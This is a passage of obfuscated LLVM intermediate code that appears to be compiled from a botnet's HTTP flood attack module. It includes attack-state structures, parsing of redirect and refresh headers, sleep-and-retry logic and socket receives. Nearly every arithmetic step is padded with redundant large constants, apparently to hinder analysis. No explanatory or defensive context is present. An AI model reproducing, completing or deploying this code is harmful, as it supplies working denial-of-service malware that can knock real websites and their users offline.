  br i1 %1874, label %1875, label %1905

; <label>:1875:                                   ; preds = %1864
  %1876 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1877 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1876, i32 0, i32 6
  %1878 = getelementptr inbounds [257 x i8], [257 x i8]* %1877, i32 0, i32 0
  %1879 = getelementptr inbounds i8, i8* %1878, i64 1
  call void @util_zero(i8* %1879, i32 255)
  %1880 = load i8*, i8** %54, align 8
  %1881 = load i32, i32* %10, align 4
  %1882 = sub i32 %1881, 138626468
  %1883 = add i32 %1882, 1
  %1884 = add i32 %1883, 138626468
  %1885 = add nsw i32 %1881, 1
  %1886 = sext i32 %1884 to i64
  %1887 = getelementptr inbounds i8, i8* %1880, i64 %1886
  %1888 = call i32 @util_strlen(i8* %1887)
  %1889 = icmp sgt i32 %1888, 0
  br i1 %1889, label %1890, label %1904

; <label>:1890:                                   ; preds = %1875
  %1891 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1892 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1891, i32 0, i32 6
  %1893 = getelementptr inbounds [257 x i8], [257 x i8]* %1892, i32 0, i32 0
  %1894 = getelementptr inbounds i8, i8* %1893, i64 1
  %1895 = load i8*, i8** %54, align 8
  %1896 = load i32, i32* %10, align 4
  %1897 = add i32 %1896, 427480486
  %1898 = add i32 %1897, 1
  %1899 = sub i32 %1898, 427480486
  %1900 = add nsw i32 %1896, 1
  %1901 = sext i32 %1899 to i64
  %1902 = getelementptr inbounds i8, i8* %1895, i64 %1901
  %1903 = call i32 @util_strcpy(i8* %1894, i8* %1902)
  br label %1904

; <label>:1904:                                   ; preds = %1890, %1875
  br label %1905

; <label>:1905:                                   ; preds = %1904, %1864
  br label %1953

; <label>:1906:                                   ; preds = %1781
  %1907 = load i8*, i8** %54, align 8
  %1908 = getelementptr inbounds i8, i8* %1907, i64 0
  %1909 = load i8, i8* %1908, align 1
  %1910 = sext i8 %1909 to i32
  %1911 = icmp eq i32 %1910, 47
  br i1 %1911, label %1912, label %1952

; <label>:1912:                                   ; preds = %1906
  %1913 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1914 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1913, i32 0, i32 6
  %1915 = getelementptr inbounds [257 x i8], [257 x i8]* %1914, i32 0, i32 0
  %1916 = getelementptr inbounds i8, i8* %1915, i64 1
  call void @util_zero(i8* %1916, i32 255)
  %1917 = load i8*, i8** %54, align 8
  %1918 = load i32, i32* %10, align 4
  %1919 = sub i32 %1918, 1552279427
  %1920 = add i32 %1919, 1
  %1921 = add i32 %1920, 1552279427
  %1922 = add nsw i32 %1918, 1
  %1923 = sext i32 %1921 to i64
  %1924 = getelementptr inbounds i8, i8* %1917, i64 %1923
  %1925 = call i32 @util_strlen(i8* %1924)
  %1926 = icmp sgt i32 %1925, 0
  br i1 %1926, label %1927, label %1951

; <label>:1927:                                   ; preds = %1912
  %1928 = load i8*, i8** %54, align 8
  %1929 = load i32, i32* %10, align 4
  %1930 = sub i32 0, 1
  %1931 = sub i32 %1929, %1930
  %1932 = add nsw i32 %1929, 1
  %1933 = sext i32 %1931 to i64
  %1934 = getelementptr inbounds i8, i8* %1928, i64 %1933
  %1935 = call i32 @util_strlen(i8* %1934)
  %1936 = icmp slt i32 %1935, 256
  br i1 %1936, label %1937, label %1951

; <label>:1937:                                   ; preds = %1927
  %1938 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1939 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1938, i32 0, i32 6
  %1940 = getelementptr inbounds [257 x i8], [257 x i8]* %1939, i32 0, i32 0
  %1941 = getelementptr inbounds i8, i8* %1940, i64 1
  %1942 = load i8*, i8** %54, align 8
  %1943 = load i32, i32* %10, align 4
  %1944 = add i32 %1943, 832548924
  %1945 = add i32 %1944, 1
  %1946 = sub i32 %1945, 832548924
  %1947 = add nsw i32 %1943, 1
  %1948 = sext i32 %1946 to i64
  %1949 = getelementptr inbounds i8, i8* %1942, i64 %1948
  %1950 = call i32 @util_strcpy(i8* %1941, i8* %1949)
  br label %1951

; <label>:1951:                                   ; preds = %1937, %1927, %1912
  br label %1952

; <label>:1952:                                   ; preds = %1951, %1906
  br label %1953

; <label>:1953:                                   ; preds = %1952, %1905
  %1954 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1955 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1954, i32 0, i32 1
  store i8 1, i8* %1955, align 4
  br label %2891

; <label>:1956:                                   ; preds = %1756
  br label %1957

; <label>:1957:                                   ; preds = %1956, %1732
  %1958 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1959 = load i32, i32* %12, align 4
  %1960 = call i8* @table_retrieve_val(i32 37, i32* null)
  %1961 = call i32 @util_stristr(i8* %1958, i32 %1959, i8* %1960)
  %1962 = icmp ne i32 %1961, -1
  br i1 %1962, label %1963, label %2363

; <label>:1963:                                   ; preds = %1957
  %1964 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1965 = load i32, i32* %12, align 4
  %1966 = call i8* @table_retrieve_val(i32 37, i32* null)
  %1967 = call i32 @util_stristr(i8* %1964, i32 %1965, i8* %1966)
  store i32 %1967, i32* %55, align 4
  %1968 = load i32, i32* %55, align 4
  %1969 = sext i32 %1968 to i64
  %1970 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1969
  %1971 = load i8, i8* %1970, align 1
  %1972 = sext i8 %1971 to i32
  %1973 = icmp eq i32 %1972, 32
  br i1 %1973, label %1974, label %1980

; <label>:1974:                                   ; preds = %1963
  %1975 = load i32, i32* %55, align 4
  %1976 = add i32 %1975, 1635386407
  %1977 = add i32 %1976, 1
  %1978 = sub i32 %1977, 1635386407
  %1979 = add nsw i32 %1975, 1
  store i32 %1978, i32* %55, align 4
  br label %1980

; <label>:1980:                                   ; preds = %1974, %1963
  %1981 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1982 = load i32, i32* %55, align 4
  %1983 = sext i32 %1982 to i64
  %1984 = getelementptr inbounds i8, i8* %1981, i64 %1983
  %1985 = load i32, i32* %12, align 4
  %1986 = load i32, i32* %55, align 4
  %1987 = add i32 %1985, 483739783
  %1988 = sub i32 %1987, %1986
  %1989 = sub i32 %1988, 483739783
  %1990 = sub nsw i32 %1985, %1986
  %1991 = call i32 @util_memsearch(i8* %1984, i32 %1989, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1991, i32* %56, align 4
  %1992 = load i32, i32* %56, align 4
  %1993 = icmp ne i32 %1992, -1
  br i1 %1993, label %1994, label %2362

; <label>:1994:                                   ; preds = %1980
  %1995 = load i32, i32* %55, align 4
  %1996 = sext i32 %1995 to i64
  %1997 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1996
  store i8* %1997, i8** %57, align 8
  %1998 = load i32, i32* %56, align 4
  %1999 = icmp sge i32 %1998, 2
  br i1 %1999, label %2000, label %2006

; <label>:2000:                                   ; preds = %1994
  %2001 = load i32, i32* %56, align 4
  %2002 = sub i32 %2001, 693022204
  %2003 = sub i32 %2002, 2
  %2004 = add i32 %2003, 693022204
  %2005 = sub nsw i32 %2001, 2
  store i32 %2004, i32* %56, align 4
  br label %2006

; <label>:2006:                                   ; preds = %2000, %1994
  %2007 = load i32, i32* %55, align 4
  %2008 = load i32, i32* %56, align 4
  %2009 = sub i32 %2007, 1454973047
  %2010 = add i32 %2009, %2008
  %2011 = add i32 %2010, 1454973047
  %2012 = add nsw i32 %2007, %2008
  %2013 = sext i32 %2011 to i64
  %2014 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2013
  store i8 0, i8* %2014, align 1
  %2015 = load i32, i32* %56, align 4
  %2016 = sub i32 0, %2015
  %2017 = sub i32 0, 1
  %2018 = add i32 %2016, %2017
  %2019 = sub i32 0, %2018
  %2020 = add nsw i32 %2015, 1
  store i32 %2019, i32* %56, align 4
  store i32 0, i32* %10, align 4
  br label %2021

; <label>:2021:                                   ; preds = %2047, %2006
  %2022 = load i8*, i8** %57, align 8
  %2023 = load i32, i32* %10, align 4
  %2024 = sext i32 %2023 to i64
  %2025 = getelementptr inbounds i8, i8* %2022, i64 %2024
  %2026 = load i8, i8* %2025, align 1
  %2027 = sext i8 %2026 to i32
  %2028 = icmp ne i32 %2027, 0
  br i1 %2028, label %2029, label %2045

; <label>:2029:                                   ; preds = %2021
  %2030 = load i8*, i8** %57, align 8
  %2031 = load i32, i32* %10, align 4
  %2032 = sext i32 %2031 to i64
  %2033 = getelementptr inbounds i8, i8* %2030, i64 %2032
  %2034 = load i8, i8* %2033, align 1
  %2035 = sext i8 %2034 to i32
  %2036 = icmp sge i32 %2035, 48
  br i1 %2036, label %2037, label %2045

; <label>:2037:                                   ; preds = %2029
  %2038 = load i8*, i8** %57, align 8
  %2039 = load i32, i32* %10, align 4
  %2040 = sext i32 %2039 to i64
  %2041 = getelementptr inbounds i8, i8* %2038, i64 %2040
  %2042 = load i8, i8* %2041, align 1
  %2043 = sext i8 %2042 to i32
  %2044 = icmp sle i32 %2043, 57
  br label %2045

; <label>:2045:                                   ; preds = %2037, %2029, %2021
  %2046 = phi i1 [ false, %2029 ], [ false, %2021 ], [ %2044, %2037 ]
  br i1 %2046, label %2047, label %2054

; <label>:2047:                                   ; preds = %2045
  %2048 = load i32, i32* %10, align 4
  %2049 = sub i32 0, %2048
  %2050 = sub i32 0, 1
  %2051 = add i32 %2049, %2050
  %2052 = sub i32 0, %2051
  %2053 = add nsw i32 %2048, 1
  store i32 %2052, i32* %10, align 4
  br label %2021

; <label>:2054:                                   ; preds = %2045
  %2055 = load i8*, i8** %57, align 8
  %2056 = load i32, i32* %10, align 4
  %2057 = sext i32 %2056 to i64
  %2058 = getelementptr inbounds i8, i8* %2055, i64 %2057
  %2059 = load i8, i8* %2058, align 1
  %2060 = sext i8 %2059 to i32
  %2061 = icmp ne i32 %2060, 0
  br i1 %2061, label %2062, label %2361

; <label>:2062:                                   ; preds = %2054
  store i32 0, i32* %58, align 4
  %2063 = load i8*, i8** %57, align 8
  %2064 = load i32, i32* %10, align 4
  %2065 = sext i32 %2064 to i64
  %2066 = getelementptr inbounds i8, i8* %2063, i64 %2065
  store i8 0, i8* %2066, align 1
  %2067 = load i32, i32* %10, align 4
  %2068 = sub i32 %2067, -962902721
  %2069 = add i32 %2068, 1
  %2070 = add i32 %2069, -962902721
  %2071 = add nsw i32 %2067, 1
  store i32 %2070, i32* %10, align 4
  %2072 = load i8*, i8** %57, align 8
  %2073 = load i32, i32* %10, align 4
  %2074 = sext i32 %2073 to i64
  %2075 = getelementptr inbounds i8, i8* %2072, i64 %2074
  %2076 = load i8, i8* %2075, align 1
  %2077 = sext i8 %2076 to i32
  %2078 = icmp eq i32 %2077, 32
  br i1 %2078, label %2079, label %2085

; <label>:2079:                                   ; preds = %2062
  %2080 = load i32, i32* %10, align 4
  %2081 = sub i32 %2080, -316261496
  %2082 = add i32 %2081, 1
  %2083 = add i32 %2082, -316261496
  %2084 = add nsw i32 %2080, 1
  store i32 %2083, i32* %10, align 4
  br label %2085

; <label>:2085:                                   ; preds = %2079, %2062
  %2086 = load i8*, i8** %57, align 8
  %2087 = load i32, i32* %10, align 4
  %2088 = sext i32 %2087 to i64
  %2089 = getelementptr inbounds i8, i8* %2086, i64 %2088
  %2090 = load i8*, i8** %57, align 8
  %2091 = load i32, i32* %10, align 4
  %2092 = sext i32 %2091 to i64
  %2093 = getelementptr inbounds i8, i8* %2090, i64 %2092
  %2094 = call i32 @util_strlen(i8* %2093)
  %2095 = call i32 @util_stristr(i8* %2089, i32 %2094, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %2096 = icmp ne i32 %2095, -1
  br i1 %2096, label %2097, label %2113

; <label>:2097:                                   ; preds = %2085
  %2098 = load i8*, i8** %57, align 8
  %2099 = load i32, i32* %10, align 4
  %2100 = sext i32 %2099 to i64
  %2101 = getelementptr inbounds i8, i8* %2098, i64 %2100
  %2102 = load i8*, i8** %57, align 8
  %2103 = load i32, i32* %10, align 4
  %2104 = sext i32 %2103 to i64
  %2105 = getelementptr inbounds i8, i8* %2102, i64 %2104
  %2106 = call i32 @util_strlen(i8* %2105)
  %2107 = call i32 @util_stristr(i8* %2101, i32 %2106, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %2108 = load i32, i32* %10, align 4
  %2109 = sub i32 %2108, -1901656418
  %2110 = add i32 %2109, %2107
  %2111 = add i32 %2110, -1901656418
  %2112 = add nsw i32 %2108, %2107
  store i32 %2111, i32* %10, align 4
  br label %2113

; <label>:2113:                                   ; preds = %2097, %2085
  %2114 = load i8*, i8** %57, align 8
  %2115 = load i32, i32* %10, align 4
  %2116 = sext i32 %2115 to i64
  %2117 = getelementptr inbounds i8, i8* %2114, i64 %2116
  %2118 = load i8, i8* %2117, align 1
  %2119 = sext i8 %2118 to i32
  %2120 = icmp eq i32 %2119, 34
  br i1 %2120, label %2121, label %2162

; <label>:2121:                                   ; preds = %2113
  %2122 = load i32, i32* %10, align 4
  %2123 = add i32 %2122, -1457818912
  %2124 = add i32 %2123, 1
  %2125 = sub i32 %2124, -1457818912
  %2126 = add nsw i32 %2122, 1
  store i32 %2125, i32* %10, align 4
  %2127 = load i8*, i8** %57, align 8
  %2128 = load i32, i32* %10, align 4
  %2129 = sext i32 %2128 to i64
  %2130 = getelementptr inbounds i8, i8* %2127, i64 %2129
  %2131 = load i8*, i8** %57, align 8
  %2132 = load i32, i32* %10, align 4
  %2133 = sext i32 %2132 to i64
  %2134 = getelementptr inbounds i8, i8* %2131, i64 %2133
  %2135 = call i32 @util_strlen(i8* %2134)
  %2136 = add i32 %2135, 1828492573
  %2137 = sub i32 %2136, 1
  %2138 = sub i32 %2137, 1828492573
  %2139 = sub nsw i32 %2135, 1
  %2140 = sext i32 %2138 to i64
  %2141 = getelementptr inbounds i8, i8* %2130, i64 %2140
  %2142 = load i8, i8* %2141, align 1
  %2143 = sext i8 %2142 to i32
  %2144 = icmp eq i32 %2143, 34
  br i1 %2144, label %2145, label %2161

; <label>:2145:                                   ; preds = %2121
  %2146 = load i8*, i8** %57, align 8
  %2147 = load i32, i32* %10, align 4
  %2148 = sext i32 %2147 to i64
  %2149 = getelementptr inbounds i8, i8* %2146, i64 %2148
  %2150 = load i8*, i8** %57, align 8
  %2151 = load i32, i32* %10, align 4
  %2152 = sext i32 %2151 to i64
  %2153 = getelementptr inbounds i8, i8* %2150, i64 %2152
  %2154 = call i32 @util_strlen(i8* %2153)
  %2155 = add i32 %2154, -1264101274
  %2156 = sub i32 %2155, 1
  %2157 = sub i32 %2156, -1264101274
  %2158 = sub nsw i32 %2154, 1
  %2159 = sext i32 %2157 to i64
  %2160 = getelementptr inbounds i8, i8* %2149, i64 %2159
  store i8 0, i8* %2160, align 1
  br label %2161

; <label>:2161:                                   ; preds = %2145, %2121
  br label %2162

; <label>:2162:                                   ; preds = %2161, %2113
  %2163 = load i8*, i8** %57, align 8
  %2164 = call i32 @util_atoi(i8* %2163, i32 10)
  store i32 %2164, i32* %58, align 4
  br label %2165

; <label>:2165:                                   ; preds = %2183, %2162
  %2166 = load i32, i32* %58, align 4
  %2167 = icmp sgt i32 %2166, 0
  br i1 %2167, label %2168, label %2181

; <label>:2168:                                   ; preds = %2165
  %2169 = load i32, i32* %58, align 4
  %2170 = icmp slt i32 %2169, 10
  br i1 %2170, label %2171, label %2181

; <label>:2171:                                   ; preds = %2168
  %2172 = load i32, i32* %27, align 4
  %2173 = load i32, i32* %58, align 4
  %2174 = add i32 %2172, -209082170
  %2175 = add i32 %2174, %2173
  %2176 = sub i32 %2175, -209082170
  %2177 = add i32 %2172, %2173
  %2178 = zext i32 %2176 to i64
  %2179 = call i64 @time(i64* null) #6
  %2180 = icmp sgt i64 %2178, %2179
  br label %2181

; <label>:2181:                                   ; preds = %2171, %2168, %2165
  %2182 = phi i1 [ false, %2168 ], [ false, %2165 ], [ %2180, %2171 ]
  br i1 %2182, label %2183, label %2185

; <label>:2183:                                   ; preds = %2181
  %2184 = call i32 @sleep(i32 1)
  br label %2165

; <label>:2185:                                   ; preds = %2181
  %2186 = load i8*, i8** %57, align 8
  %2187 = load i32, i32* %10, align 4
  %2188 = sext i32 %2187 to i64
  %2189 = getelementptr inbounds i8, i8* %2186, i64 %2188
  store i8* %2189, i8** %57, align 8
  %2190 = load i8*, i8** %57, align 8
  %2191 = load i8*, i8** %57, align 8
  %2192 = call i32 @util_strlen(i8* %2191)
  %2193 = call i32 @util_stristr(i8* %2190, i32 %2192, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %2194 = icmp eq i32 %2193, 4
  br i1 %2194, label %2195, label %2305

; <label>:2195:                                   ; preds = %2185
  store i32 7, i32* %10, align 4
  %2196 = load i8*, i8** %57, align 8
  %2197 = getelementptr inbounds i8, i8* %2196, i64 4
  %2198 = load i8, i8* %2197, align 1
  %2199 = sext i8 %2198 to i32
  %2200 = icmp eq i32 %2199, 115
  br i1 %2200, label %2201, label %2207

; <label>:2201:                                   ; preds = %2195
  %2202 = load i32, i32* %10, align 4
  %2203 = add i32 %2202, -1200415216
  %2204 = add i32 %2203, 1
  %2205 = sub i32 %2204, -1200415216
  %2206 = add nsw i32 %2202, 1
  store i32 %2205, i32* %10, align 4
  br label %2207

; <label>:2207:                                   ; preds = %2201, %2195
  %2208 = load i8*, i8** %57, align 8
  %2209 = load i8*, i8** %57, align 8
  %2210 = load i32, i32* %10, align 4
  %2211 = sext i32 %2210 to i64
  %2212 = getelementptr inbounds i8, i8* %2209, i64 %2211
  %2213 = load i32, i32* %56, align 4
  %2214 = load i32, i32* %10, align 4
  %2215 = sub i32 %2213, 326418804
  %2216 = sub i32 %2215, %2214
  %2217 = add i32 %2216, 326418804
  %2218 = sub nsw i32 %2213, %2214
  %2219 = sext i32 %2217 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2208, i8* %2212, i64 %2219, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %2220

; <label>:2220:                                   ; preds = %2241, %2207
  %2221 = load i8*, i8** %57, align 8
  %2222 = load i32, i32* %10, align 4
  %2223 = sext i32 %2222 to i64
  %2224 = getelementptr inbounds i8, i8* %2221, i64 %2223
  %2225 = load i8, i8* %2224, align 1
  %2226 = sext i8 %2225 to i32
  %2227 = icmp ne i32 %2226, 0
  br i1 %2227, label %2228, label %2248

; <label>:2228:                                   ; preds = %2220
  %2229 = load i8*, i8** %57, align 8
  %2230 = load i32, i32* %10, align 4
  %2231 = sext i32 %2230 to i64
  %2232 = getelementptr inbounds i8, i8* %2229, i64 %2231
  %2233 = load i8, i8* %2232, align 1
  %2234 = sext i8 %2233 to i32
  %2235 = icmp eq i32 %2234, 47
  br i1 %2235, label %2236, label %2241

; <label>:2236:                                   ; preds = %2228
  %2237 = load i8*, i8** %57, align 8
  %2238 = load i32, i32* %10, align 4
  %2239 = sext i32 %2238 to i64
  %2240 = getelementptr inbounds i8, i8* %2237, i64 %2239
  store i8 0, i8* %2240, align 1
  br label %2248

; <label>:2241:                                   ; preds = %2228
  %2242 = load i32, i32* %10, align 4
  %2243 = sub i32 0, %2242
  %2244 = sub i32 0, 1
  %2245 = add i32 %2243, %2244
  %2246 = sub i32 0, %2245
  %2247 = add nsw i32 %2242, 1
  store i32 %2246, i32* %10, align 4
  br label %2220

; <label>:2248:                                   ; preds = %2236, %2220
  %2249 = load i8*, i8** %57, align 8
  %2250 = call i32 @util_strlen(i8* %2249)
  %2251 = icmp sgt i32 %2250, 0
  br i1 %2251, label %2252, label %2262

; <label>:2252:                                   ; preds = %2248
  %2253 = load i8*, i8** %57, align 8
  %2254 = call i32 @util_strlen(i8* %2253)
  %2255 = icmp slt i32 %2254, 128
  br i1 %2255, label %2256, label %2262

; <label>:2256:                                   ; preds = %2252
  %2257 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2258 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2257, i32 0, i32 7
  %2259 = getelementptr inbounds [129 x i8], [129 x i8]* %2258, i32 0, i32 0
  %2260 = load i8*, i8** %57, align 8
  %2261 = call i32 @util_strcpy(i8* %2259, i8* %2260)
  br label %2262

; <label>:2262:                                   ; preds = %2256, %2252, %2248
  %2263 = load i8*, i8** %57, align 8
  %2264 = load i32, i32* %10, align 4
  %2265 = sub i32 0, %2264
  %2266 = sub i32 0, 1
  %2267 = add i32 %2265, %2266
  %2268 = sub i32 0, %2267
  %2269 = add nsw i32 %2264, 1
  %2270 = sext i32 %2268 to i64
  %2271 = getelementptr inbounds i8, i8* %2263, i64 %2270
  %2272 = call i32 @util_strlen(i8* %2271)
  %2273 = icmp slt i32 %2272, 256
  br i1 %2273, label %2274, label %2304

; <label>:2274:                                   ; preds = %2262
  %2275 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2276 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2275, i32 0, i32 6
  %2277 = getelementptr inbounds [257 x i8], [257 x i8]* %2276, i32 0, i32 0
  %2278 = getelementptr inbounds i8, i8* %2277, i64 1
  call void @util_zero(i8* %2278, i32 255)
  %2279 = load i8*, i8** %57, align 8
  %2280 = load i32, i32* %10, align 4
  %2281 = sub i32 %2280, -606273646
  %2282 = add i32 %2281, 1
  %2283 = add i32 %2282, -606273646
  %2284 = add nsw i32 %2280, 1
  %2285 = sext i32 %2283 to i64
  %2286 = getelementptr inbounds i8, i8* %2279, i64 %2285
  %2287 = call i32 @util_strlen(i8* %2286)
  %2288 = icmp sgt i32 %2287, 0
  br i1 %2288, label %2289, label %2303

; <label>:2289:                                   ; preds = %2274
  %2290 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2291 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2290, i32 0, i32 6
  %2292 = getelementptr inbounds [257 x i8], [257 x i8]* %2291, i32 0, i32 0
  %2293 = getelementptr inbounds i8, i8* %2292, i64 1
  %2294 = load i8*, i8** %57, align 8
  %2295 = load i32, i32* %10, align 4
  %2296 = sub i32 %2295, -1036139793
  %2297 = add i32 %2296, 1
  %2298 = add i32 %2297, -1036139793
  %2299 = add nsw i32 %2295, 1
  %2300 = sext i32 %2298 to i64
  %2301 = getelementptr inbounds i8, i8* %2294, i64 %2300
  %2302 = call i32 @util_strcpy(i8* %2293, i8* %2301)
  br label %2303

; <label>:2303:                                   ; preds = %2289, %2274
  br label %2304

; <label>:2304:                                   ; preds = %2303, %2262
  br label %2354

; <label>:2305:                                   ; preds = %2185
  %2306 = load i8*, i8** %57, align 8
  %2307 = getelementptr inbounds i8, i8* %2306, i64 0
  %2308 = load i8, i8* %2307, align 1
  %2309 = sext i8 %2308 to i32
  %2310 = icmp eq i32 %2309, 47
  br i1 %2310, label %2311, label %2353

; <label>:2311:                                   ; preds = %2305
  %2312 = load i8*, i8** %57, align 8
  %2313 = load i32, i32* %10, align 4
  %2314 = sub i32 %2313, -335607927
  %2315 = add i32 %2314, 1
  %2316 = add i32 %2315, -335607927
  %2317 = add nsw i32 %2313, 1
  %2318 = sext i32 %2316 to i64
  %2319 = getelementptr inbounds i8, i8* %2312, i64 %2318
  %2320 = call i32 @util_strlen(i8* %2319)
  %2321 = icmp slt i32 %2320, 256
  br i1 %2321, label %2322, label %2352

; <label>:2322:                                   ; preds = %2311
  %2323 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2323, i32 0, i32 6
  %2325 = getelementptr inbounds [257 x i8], [257 x i8]* %2324, i32 0, i32 0
  %2326 = getelementptr inbounds i8, i8* %2325, i64 1
  call void @util_zero(i8* %2326, i32 255)
  %2327 = load i8*, i8** %57, align 8
  %2328 = load i32, i32* %10, align 4
  %2329 = sub i32 %2328, -1111356817
  %2330 = add i32 %2329, 1
  %2331 = add i32 %2330, -1111356817
  %2332 = add nsw i32 %2328, 1
  %2333 = sext i32 %2331 to i64
  %2334 = getelementptr inbounds i8, i8* %2327, i64 %2333
  %2335 = call i32 @util_strlen(i8* %2334)
  %2336 = icmp sgt i32 %2335, 0
  br i1 %2336, label %2337, label %2351

; <label>:2337:                                   ; preds = %2322
  %2338 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2339 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2338, i32 0, i32 6
  %2340 = getelementptr inbounds [257 x i8], [257 x i8]* %2339, i32 0, i32 0
  %2341 = getelementptr inbounds i8, i8* %2340, i64 1
  %2342 = load i8*, i8** %57, align 8
  %2343 = load i32, i32* %10, align 4
  %2344 = sub i32 %2343, -1187083512
  %2345 = add i32 %2344, 1
  %2346 = add i32 %2345, -1187083512
  %2347 = add nsw i32 %2343, 1
  %2348 = sext i32 %2346 to i64
  %2349 = getelementptr inbounds i8, i8* %2342, i64 %2348
  %2350 = call i32 @util_strcpy(i8* %2341, i8* %2349)
  br label %2351

; <label>:2351:                                   ; preds = %2337, %2322
  br label %2352

; <label>:2352:                                   ; preds = %2351, %2311
  br label %2353

; <label>:2353:                                   ; preds = %2352, %2305
  br label %2354

; <label>:2354:                                   ; preds = %2353, %2304
  %2355 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2356 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2355, i32 0, i32 9
  %2357 = getelementptr inbounds [9 x i8], [9 x i8]* %2356, i32 0, i32 0
  %2358 = call i8* @strcpy(i8* %2357, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %2359 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2360 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2359, i32 0, i32 1
  store i8 10, i8* %2360, align 4
  br label %2891

; <label>:2361:                                   ; preds = %2054
  br label %2362

; <label>:2362:                                   ; preds = %2361, %1980
  br label %2363

; <label>:2363:                                   ; preds = %2362, %1957
  %2364 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2365 = load i32, i32* %12, align 4
  %2366 = call i32 @util_memsearch(i8* %2364, i32 %2365, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %2366, i32* %37, align 4
  %2367 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2368 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2367, i32 0, i32 9
  %2369 = getelementptr inbounds [9 x i8], [9 x i8]* %2368, i32 0, i32 0
  %2370 = call signext i8 @util_strcmp(i8* %2369, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %2371 = sext i8 %2370 to i32
  %2372 = icmp ne i32 %2371, 0
  br i1 %2372, label %2380, label %2373

; <label>:2373:                                   ; preds = %2363
  %2374 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2375 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2374, i32 0, i32 9
  %2376 = getelementptr inbounds [9 x i8], [9 x i8]* %2375, i32 0, i32 0
  %2377 = call signext i8 @util_strcmp(i8* %2376, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %2378 = sext i8 %2377 to i32
  %2379 = icmp ne i32 %2378, 0
  br i1 %2379, label %2380, label %2383

; <label>:2380:                                   ; preds = %2373, %2363
  %2381 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2382 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2381, i32 0, i32 1
  store i8 7, i8* %2382, align 4
  br label %2394

; <label>:2383:                                   ; preds = %2373
  %2384 = load i32, i32* %12, align 4
  %2385 = load i32, i32* %37, align 4
  %2386 = icmp sgt i32 %2384, %2385
  br i1 %2386, label %2387, label %2390

; <label>:2387:                                   ; preds = %2383
  %2388 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2389 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2388, i32 0, i32 1
  store i8 10, i8* %2389, align 4
  br label %2393

; <label>:2390:                                   ; preds = %2383
  %2391 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2392 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2391, i32 0, i32 1
  store i8 1, i8* %2392, align 4
  br label %2393

; <label>:2393:                                   ; preds = %2390, %2387
  br label %2394

; <label>:2394:                                   ; preds = %2393, %2380
  %2395 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2396 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2395, i32 0, i32 0
  %2397 = load i32, i32* %2396, align 4
  %2398 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2399 = load i32, i32* %37, align 4
  %2400 = sext i32 %2399 to i64
  %2401 = call i64 @recv(i32 %2397, i8* %2398, i64 %2400, i32 16384)
  %2402 = trunc i64 %2401 to i32
  store i32 %2402, i32* %12, align 4
  br label %2889

; <label>:2403:                                   ; preds = %1244
  %2404 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2405 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2404, i32 0, i32 1
  %2406 = load i8, i8* %2405, align 4
